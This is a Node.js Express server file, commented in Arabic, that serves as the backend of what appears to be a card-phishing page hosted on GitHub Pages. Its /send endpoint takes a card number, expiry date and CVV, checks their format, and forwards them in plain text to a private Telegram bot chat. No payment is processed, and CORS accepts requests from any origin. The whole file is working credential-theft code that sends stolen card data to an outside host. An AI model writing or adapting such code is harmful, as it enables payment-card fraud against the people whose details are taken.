import express from "express";
import axios from "axios";
import dotenv from "dotenv";
import bodyParser from "body-parser";
import cors from "cors";  // إضافة CORS للسماح بطلبات من GitHub Pages

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors()); // السماح بالطلبات من جميع المصادر
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.post("/send", async (req, res) => {
    try {
        const { cardNumber, expiryDate, cvv } = req.body;

        if (!cardNumber || !expiryDate || !cvv) {
            return res.status(400).json({ error: "يجب ملء جميع الحقول!" });
        }

        // التحقق من صحة البيانات
        if (cardNumber.length !== 16 || isNaN(cardNumber)) {
            return res.status(400).json({ error: "رقم البطاقة غير صحيح!" });
        }

        if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
            return res.status(400).json({ error: "تاريخ الانتهاء غير صحيح!" });
        }

        if (cvv.length !== 3 || isNaN(cvv)) {
            return res.status(400).json({ error: "رمز الأمان غير صحيح!" });
        }

        const text = `💳 معلومات الدفع الجديدة:\n\n🔢 رقم البطاقة: ${cardNumber}\n📅 تاريخ الانتهاء: ${expiryDate}\n🔐 CVV: ${cvv}`;

        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        });

        res.json({ success: true, message: "تم إرسال البيانات بنجاح!" });
    } catch (error) {
        console.error("خطأ في إرسال البيانات:", error);
        res.status(500).json({ error: "حدث خطأ أثناء الإرسال." });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server is running on port ${PORT}`);
});
